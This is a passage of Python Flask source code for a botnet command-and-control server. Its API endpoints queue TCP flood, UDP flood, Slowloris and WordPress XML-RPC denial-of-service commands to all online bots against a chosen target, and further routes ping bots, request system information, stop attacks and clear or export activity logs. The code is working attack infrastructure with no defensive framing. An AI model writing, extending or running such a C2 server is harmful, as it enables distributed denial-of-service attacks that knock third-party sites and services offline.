                    'type': 'tcp_flood',
                    'target': target,
                    'duration': duration,
                    'threads': threads
                }
                
                if bot_id not in commands_queue:
                    commands_queue[bot_id] = []
                commands_queue[bot_id].append(command)
                sent_count += 1
        
        log_message = f'TCP flood to {sent_count} bots -> {target} ({threads} threads)'
        log_activity(log_message, 'warning')
        
        print(f"[+] {log_message}")
        return jsonify({'status': 'success', 'message': f'TCP flood sent to {sent_count} bots', 'sent_count': sent_count})
    except Exception as e:
        error_msg = f'Error in launch_tcp_attack: {str(e)}'
        log_activity(error_msg, 'error')
        print(f"[!] {error_msg}")
        return jsonify({'status': 'error', 'message': str(e)}), 500

@app.route('/api/attack/udp', methods=['POST', 'OPTIONS'])
def launch_udp_attack():
    """Launch UDP flood attack"""
    if request.method == 'OPTIONS':
        return '', 200
    
    try:
        data = request.json
        
        target = data.get('target')
        duration = int(data.get('duration', 60))
        threads = int(data.get('threads', 75))
        
        if not target:
            return jsonify({'status': 'error', 'message': 'No target specified'}), 400
        
        target_bots = get_online_bots()
        
        if not target_bots:
            return jsonify({'status': 'error', 'message': 'No online bots available'}), 400
        
        sent_count = 0
        
        with queue_lock:
            for bot_id in target_bots:
                command = {
                    'type': 'udp_flood',
                    'target': target,
                    'duration': duration,
                    'threads': threads
                }
                
                if bot_id not in commands_queue:
                    commands_queue[bot_id] = []
                commands_queue[bot_id].append(command)
                sent_count += 1
        
        log_message = f'UDP flood to {sent_count} bots -> {target} ({threads} threads)'
        log_activity(log_message, 'warning')
        
        print(f"[+] {log_message}")
        return jsonify({'status': 'success', 'message': f'UDP flood sent to {sent_count} bots', 'sent_count': sent_count})
    except Exception as e:
        error_msg = f'Error in launch_udp_attack: {str(e)}'
        log_activity(error_msg, 'error')
        print(f"[!] {error_msg}")
        return jsonify({'status': 'error', 'message': str(e)}), 500

@app.route('/api/attack/slowloris', methods=['POST', 'OPTIONS'])
def launch_slowloris_attack():
    """Launch Slowloris attack"""
    if request.method == 'OPTIONS':
        return '', 200
    
    try:
        data = request.json
        
        target = data.get('target')
        connections = int(data.get('connections', 200))
        duration = int(data.get('duration', 120))
        
        if not target:
            return jsonify({'status': 'error', 'message': 'No target specified'}), 400
        
        target_bots = get_online_bots()
        
        if not target_bots:
            return jsonify({'status': 'error', 'message': 'No online bots available'}), 400
        
        sent_count = 0
        
        with queue_lock:
            for bot_id in target_bots:
                command = {
                    'type': 'slowloris',
                    'target': target,
                    'connections': connections,
                    'duration': duration
                }
                
                if bot_id not in commands_queue:
                    commands_queue[bot_id] = []
                commands_queue[bot_id].append(command)
                sent_count += 1
        
        log_message = f'Slowloris attack to {sent_count} bots -> {target} ({connections} connections)'
        log_activity(log_message, 'warning')
        
        print(f"[+] {log_message}")
        return jsonify({'status': 'success', 'message': f'Slowloris sent to {sent_count} bots', 'sent_count': sent_count})
    except Exception as e:
        error_msg = f'Error in launch_slowloris_attack: {str(e)}'
        log_activity(error_msg, 'error')
        print(f"[!] {error_msg}")
        return jsonify({'status': 'error', 'message': str(e)}), 500

@app.route('/api/attack/wordpress', methods=['POST', 'OPTIONS'])
def launch_wordpress_attack():
    """Launch WordPress XML-RPC attack"""
    if request.method == 'OPTIONS':
        return '', 200
    
    try:
        data = request.json
        
        target = data.get('target')
        threads = int(data.get('threads', 50))
        duration = int(data.get('duration', 60))
        
        if not target:
            return jsonify({'status': 'error', 'message': 'No target specified'}), 400
        
        target_bots = get_online_bots()
        
        if not target_bots:
            return jsonify({'status': 'error', 'message': 'No online bots available'}), 400
        
        sent_count = 0
        
        with queue_lock:
            for bot_id in target_bots:
                command = {
                    'type': 'wordpress_xmlrpc',
                    'target': target,
                    'threads': threads,
                    'duration': duration
                }
                
                if bot_id not in commands_queue:
                    commands_queue[bot_id] = []
                commands_queue[bot_id].append(command)
                sent_count += 1
        
        log_message = f'WordPress XML-RPC attack to {sent_count} bots -> {target} ({threads} threads)'
        log_activity(log_message, 'warning')
        
        print(f"[+] {log_message}")
        return jsonify({'status': 'success', 'message': f'WordPress attack sent to {sent_count} bots', 'sent_count': sent_count})
    except Exception as e:
        error_msg = f'Error in launch_wordpress_attack: {str(e)}'
        log_activity(error_msg, 'error')
        print(f"[!] {error_msg}")
        return jsonify({'status': 'error', 'message': str(e)}), 500

@app.route('/api/command/ping', methods=['POST', 'OPTIONS'])
def send_ping():
    """Send ping to bots"""
    if request.method == 'OPTIONS':
        return '', 200
    
    try:
        target_bots = get_online_bots()
        
        if not target_bots:
            return jsonify({'status': 'error', 'message': 'No online bots available'}), 400
        
        sent_count = 0
        
        with queue_lock:
            for bot_id in target_bots:
                command = {'type': 'ping'}
                
                if bot_id not in commands_queue:
                    commands_queue[bot_id] = []
                commands_queue[bot_id].append(command)
                sent_count += 1
        
        log_activity(f'Ping sent to {sent_count} bots', 'success')
        print(f"[+] Ping sent to {sent_count} bots")
        return jsonify({'status': 'success', 'message': f'Ping sent to {sent_count} bots', 'sent_count': sent_count})
    except Exception as e:
        error_msg = f'Error in send_ping: {str(e)}'
        log_activity(error_msg, 'error')
        print(f"[!] {error_msg}")
        return jsonify({'status': 'error', 'message': str(e)}), 500

@app.route('/api/command/sysinfo', methods=['POST', 'OPTIONS'])
def send_sysinfo():
    """Request system info from bots"""
    if request.method == 'OPTIONS':
        return '', 200
    
    try:
        target_bots = get_online_bots()
        
        if not target_bots:
            return jsonify({'status': 'error', 'message': 'No online bots available'}), 400
        
        sent_count = 0
        
        with queue_lock:
            for bot_id in target_bots:
                command = {'type': 'sysinfo'}
                
                if bot_id not in commands_queue:
                    commands_queue[bot_id] = []
                commands_queue[bot_id].append(command)
                sent_count += 1
        
        log_activity(f'Sysinfo request sent to {sent_count} bots', 'success')
        print(f"[+] Sysinfo sent to {sent_count} bots")
        return jsonify({'status': 'success', 'message': f'Sysinfo request sent to {sent_count} bots', 'sent_count': sent_count})
    except Exception as e:
        error_msg = f'Error in send_sysinfo: {str(e)}'
        log_activity(error_msg, 'error')
        print(f"[!] {error_msg}")
        return jsonify({'status': 'error', 'message': str(e)}), 500

@app.route('/api/command/stop', methods=['POST', 'OPTIONS'])
def send_stop_all():
    """Stop all attacks on bots"""
    if request.method == 'OPTIONS':
        return '', 200
    
    try:
        target_bots = get_online_bots()
        
        if not target_bots:
            return jsonify({'status': 'error', 'message': 'No online bots available'}), 400
        
        sent_count = 0
        
        with queue_lock:
            for bot_id in target_bots:
                command = {'type': 'stop_all'}
                
                if bot_id not in commands_queue:
                    commands_queue[bot_id] = []
                commands_queue[bot_id].append(command)
                sent_count += 1
        
        log_activity(f'Stop all attacks command sent to {sent_count} bots', 'error')
        print(f"[+] Stop command sent to {sent_count} bots")
        return jsonify({'status': 'success', 'message': f'Stop command sent to {sent_count} bots', 'sent_count': sent_count})
    except Exception as e:
        error_msg = f'Error in send_stop_all: {str(e)}'
        log_activity(error_msg, 'error')
        print(f"[!] {error_msg}")
        return jsonify({'status': 'error', 'message': str(e)}), 500

@app.route('/api/logs/clear', methods=['POST', 'OPTIONS'])
def clear_logs():
    """Clear all activity logs"""
    if request.method == 'OPTIONS':
        return '', 200
    
    try:
        with log_lock:
            attack_logs.clear()
        log_activity('Activity logs cleared', 'warning')
        print(f"[+] Activity logs cleared")
        return jsonify({'status': 'success', 'message': 'Activity logs cleared'})
    except Exception as e:
        error_msg = f'Error in clear_logs: {str(e)}'
        print(f"[!] {error_msg}")
        return jsonify({'status': 'error', 'message': str(e)}), 500

@app.route('/api/logs/export', methods=['GET', 'OPTIONS'])
def export_logs():
    """Export logs as text file"""
    if request.method == 'OPTIONS':
        return '', 200
    
    try:
        with log_lock:
            log_text = "C2 SERVER LOGS - FIXED + ALL METHODS\n"
            log_text += "=" * 60 + "\n\n"
            for log in attack_logs:
                log_text += f"[{log['time']}] {log['message']}\n"
        
        return Response(log_text, mimetype='text/plain')
    except Exception as e:
        error_msg = f'Error in export_logs: {str(e)}'
        print(f"[!] {error_msg}")
        return jsonify({'status': 'error', 'message': str(e)}), 500

def cleanup():
    """Cleanup on server shutdown"""
    print("\n[!] Server shutting down...")
    print(f"[+] Total bots connected: {len(approved_bots)}")
    print(f"[+] Goodbye!")

if __name__ == '__main__':
    print("\n" + "="*60)
    print("  FIXED C2 SERVER + ALL ATTACK METHODS")
    print("="*60)
    
    port = int(os.environ.get("PORT", 5000))
    
    print(f"[+] Starting server on port {port}")
    print(f"[+] Online threshold: {ONLINE_THRESHOLD} seconds")
    print(f"[+] Update interval: 2 seconds")
    print(f"[+] Attack Methods: HTTP, TCP, UDP, Slowloris, WordPress")
    print(f"[+] Waiting for connections...\n")
    
    atexit.register(cleanup)
    
    app.run(
        host='0.0.0.0',
        port=port,
        debug=False,
        threaded=True
    )
